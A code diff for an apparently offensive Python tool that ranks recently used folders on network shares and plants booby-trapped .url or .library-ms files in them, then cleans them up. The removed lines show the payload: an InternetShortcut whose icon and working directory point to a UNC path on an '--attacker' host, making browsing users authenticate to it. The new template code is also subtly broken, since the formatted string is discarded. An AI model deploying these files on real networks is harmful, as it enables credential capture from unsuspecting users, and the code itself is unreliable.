@@ -48,10 +48,12 @@ def review_folder(folder_rankings, unc_path, active_threshold, depth, fast):
 
             # If the file was recently accessed and is not a payload file
             access_time = datetime.fromtimestamp(file_info.stat().st_atime)
+
             if datetime.now() - access_time <= timedelta(
                     days=active_threshold) and file_info.name != args.payload:
                 # Then increment the ranking of the folder to reflect the level of activity
                 ranking += 1
+
         elif file_info.is_dir():  # Track a list of subfolders in the current folder
             folders.append(f'{unc_path}\\{file_info.name}')
 
@@ -97,8 +99,9 @@ parser.add_argument('--attacker', required='--deploy' in sys.argv,
                     help='Attacker IP or hostname to place in malicious URL')
 
 # For deployment and cleanup
-parser.add_argument('--payload', default='@Test Do Not Remove.url', help='Name of payload file '
-                                                                         'ending in .url')
+parser.add_argument('--payload', default='@Test_Do_Not_Remove.library-MS', required='--deploy' in
+                    sys.argv or '--cleanup' in sys.argv, help='Name of payload file ending in .url'
+                                                              ' or .library-ms')
 
 # Modes
 parser.add_argument('--identify', action='store_true',
@@ -156,10 +159,20 @@ if args.identify:  # If the identification functionality is used to identify act
     with open('folder_targets.txt', mode='w') as f:
         for share_unc in filtered_rankings:
             f.write(share_unc + '\n')
+
 elif args.deploy:  # Else if the deploy functionality is used to deploy payloads
     payloads_written = []  # Track the UNC path of the folder to which each payload is written
-    payload_contents = f'[InternetShortcut]\nURL={args.attacker}\nWorkingDirectory=\\\\' + \
-                       f'{args.attacker}\\test\nIconFile=\\\\{args.attacker}\\A.icon\nIconIndex=1 '
+
+    # Select a template file name based on the payload name
+    if '.library-ms' in args.payload:
+        template_name = 'library_template.library-ms'
+    elif '.url' in args.payload:
+        template_name = 'url_template.url'
+
+    # Read the payload template contents into a file and substitute the attacker IP or hostname
+    with open(template_name, 'r') as template_file:
+        payload_contents = template_file.read()
+        payload_contents.format(attacker_ip=args.attacker)
 
     # Iterate over each target folder path
     for folder_unc in targets:
@@ -177,6 +190,7 @@ elif args.deploy:  # Else if the deploy functionality is used to deploy payloads
     with open('payloads_written.txt', mode='a') as f:
         for payload_folder_unc in payloads_written:
             f.write(payload_folder_unc + '\n')
+
 elif args.cleanup:  # Else if the cleanup functionality is used to delete deployed payloads
     # Iterate over each folder where payloads were deployed
     for payload_folder in targets:
